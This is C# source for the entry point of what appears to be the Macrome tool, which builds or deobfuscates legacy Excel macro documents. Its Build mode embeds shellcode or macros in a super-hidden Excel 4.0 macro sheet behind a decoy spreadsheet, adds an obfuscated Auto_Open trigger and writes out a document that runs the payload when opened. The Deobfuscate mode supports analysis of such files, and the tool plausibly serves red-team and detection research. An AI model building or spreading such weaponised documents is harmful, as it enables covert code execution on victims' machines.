using System;
using System.Collections.Generic;
using System.CommandLine;
using System.CommandLine.Builder;
using System.CommandLine.Parsing;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Text;
using System.Threading;
using b2xtranslator.Spreadsheet.XlsFileFormat;
using b2xtranslator.Spreadsheet.XlsFileFormat.Records;
using b2xtranslator.StructuredStorage.Reader;

namespace Macrome
{

    public class Program
    { 
        public static string AssemblyDirectory
        {
            get
            {
                string codeBase = Assembly.GetExecutingAssembly().CodeBase;
                UriBuilder uri = new UriBuilder(codeBase);
                string path = Uri.UnescapeDataString(uri.Path);
                return Path.GetDirectoryName(path);
            }
        }


        /// <summary>
        /// Deobfuscate a legacy XLS document to enable simpler analysis.
        /// </summary>
        /// <param name="path">Path to the XLS file to deobfuscate</param>
        /// <param name="neuterFile">Flag to insert a HALT() expression into all Auto_Open start locations. NOT IMPLEMENTED</param>
        /// <param name="outputFileName">The output filename used for the generated document. Defaults to deobfuscated.xls</param>
        public static void Deobfuscate(FileInfo path, bool neuterFile = false, string outputFileName = "deobfuscated.xls")
        {
            if (path == null)
            {
                Console.WriteLine("path argument must be specified in Deobfuscate mode. Run deobfuscate -h for usage instructions.");
                return;
            }

            if (path.Exists == false)
            {
                Console.WriteLine("path file does not exist.");
                return;
            }

            if (neuterFile)
            {
                throw new NotImplementedException("XLS Neutering Not Implemented Yet");
            }

            WorkbookStream wbs = new WorkbookStream(path.FullName);
            WorkbookEditor wbEditor = new WorkbookEditor(wbs);
            wbEditor.NormalizeAutoOpenLabels();
            wbEditor.UnhideSheets();

            ExcelDocWriter writer = new ExcelDocWriter();
            string outputPath = AssemblyDirectory + Path.DirectorySeparatorChar + outputFileName;
            Console.WriteLine("Writing deobfuscated document to {0}", outputPath);
            writer.WriteDocument(outputPath, wbEditor.WbStream);
        }

        /// <summary>
        /// Generate an Excel Document with a hidden macro sheet that will execute code described by the payload argument.
        /// </summary>
        /// <param name="decoyDocument">File path to the base Excel 2003 sheet that should be visible to users.</param>
        /// <param name="payload">Either binary shellcode or a newline separated list of Excel Macros to execute</param>
        /// <param name="payloadType">Specify if the payload is binary shellcode or a macro list. Defaults to Shellcode</param>
        /// <param name="macroSheetName">The name that should be used for the macro sheet. Defaults to Sheet2</param>
        /// <param name="outputFileName">The output filename used for the generated document. Defaults to output.xls</param>
        /// <param name="debugMode">Set this to true to make the program wait for a debugger to attach. Defaults to false</param>
        public static void Build(FileInfo decoyDocument, FileInfo payload,
            PayloadType payloadType = PayloadType.Shellcode,
            string macroSheetName = "Sheet2", string outputFileName = "output.xls", bool debugMode = false)
        {
            if (decoyDocument == null || payload == null)
            {
                Console.WriteLine("decoy-document and payload must be specified in Build mode. Run build -h for usage instructions.");
                return;
            }

            //Useful for remote debugging
            if (debugMode)
            {
                Console.WriteLine("Waiting for debugger to attach");
                while (!Debugger.IsAttached)
                {
                    Thread.Sleep(100);
                }
                Console.WriteLine("Debugger attached");
            }

            List<BiffRecord> defaultMacroSheetRecords = GetDefaultMacroSheetRecords();

            string decoyDocPath = decoyDocument.FullName;

            WorkbookStream wbs = LoadDecoyDocument(decoyDocPath);
            WorkbookEditor wbe = new WorkbookEditor(wbs);

            wbe.AddMacroSheet(defaultMacroSheetRecords, macroSheetName, BoundSheet8.HiddenState.SuperHidden);

            wbe.AddLabel("Auto_Open", 0, 0);

            List<string> macros = null;
            byte[] binaryPayload = null;

            switch (payloadType)
            {
                case PayloadType.Shellcode:
                    macros = MacroPatterns.GetBinaryLoaderPattern(macroSheetName);
                    binaryPayload = File.ReadAllBytes(payload.FullName);
                    break;
                case PayloadType.Macro:
                    macros = File.ReadAllLines(payload.FullName).ToList();
                    break;
                default:
                    throw new ArgumentException(string.Format("Invalid PayloadType {0}", payloadType),
                        "payloadType");
            }

            wbe.SetMacroSheetContent(macros, binaryPayload);

            wbe.ObfuscateAutoOpen();

            ExcelDocWriter writer = new ExcelDocWriter();
            string outputPath = AssemblyDirectory + Path.DirectorySeparatorChar + outputFileName;
            Console.WriteLine("Writing generated document to {0}", outputPath);
            writer.WriteDocument(outputPath, wbe.WbStream);
        }


        /// <summary>
        /// Build an obfuscated XLS Macro Document, or Deobfuscate an existing malicious XLS Macro Document.
        /// </summary>
        /// <param name="args"></param>
        public static void Main(string[] args)
        {
            try
            {
                Command buildCommand = new Command("b",null);
                buildCommand.AddAlias("build");
                MethodInfo buildMethodInfo = typeof(Program).GetMethod(nameof(Build));
                buildCommand.ConfigureFromMethod(buildMethodInfo);

                Command deobfuscateCommand = new Command("d",null);
                deobfuscateCommand.AddAlias("deobfuscate");
                MethodInfo deobfuscateMethodInfo = typeof(Program).GetMethod(nameof(Deobfuscate));
                deobfuscateCommand.ConfigureFromMethod(deobfuscateMethodInfo);

                RootCommand rootCommand = new RootCommand("Build an obfuscated XLS Macro Document, or Deobfuscate an existing malicious XLS Macro Document.")
                {
                    deobfuscateCommand,
                    buildCommand,
                    
                };

                CommandLineBuilder builder = new CommandLineBuilder(rootCommand);
                builder.ConfigureHelpFromXmlComments(buildMethodInfo, null);

                //Manually set this after reading the XML for descriptions
                builder.Command.Description =
                    "Build an obfuscated XLS Macro Document or Deobfuscate an existing malicious XLS Macro Document.";

                Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);

                builder
                    .UseDefaults()
                    .Build()
                    .Invoke(args);
            }
            catch (Exception e)
            {
                Console.WriteLine("Unexpected Exception Occurred:\n");
                Console.WriteLine(e);
            }
        }

        private static WorkbookStream LoadDecoyDocument(string decoyDocPath)
        {
            using (var fs = new FileStream(decoyDocPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                return wbs;
            }
        }

        private static List<BiffRecord> GetDefaultMacroSheetRecords()
        {
            string defaultMacroPath = AssemblyDirectory + Path.DirectorySeparatorChar + @"default_macro_template.xls";
            using (var fs = new FileStream(defaultMacroPath, FileMode.Open))
            {
                StructuredStorageReader ssr = new StructuredStorageReader(fs);
                var wbStream = ssr.GetStream("Workbook");
                byte[] wbBytes = new byte[wbStream.Length];
                wbStream.Read(wbBytes, 0, wbBytes.Length, 0);
                WorkbookStream wbs = new WorkbookStream(wbBytes);
                //The last BOF/EOF set is our Macro sheet.
                List<BiffRecord> sheetRecords = wbs.GetRecordsForBOFRecord(wbs.GetAllRecordsByType<BOF>().Last());
                return sheetRecords;
            }

        }
    }
}
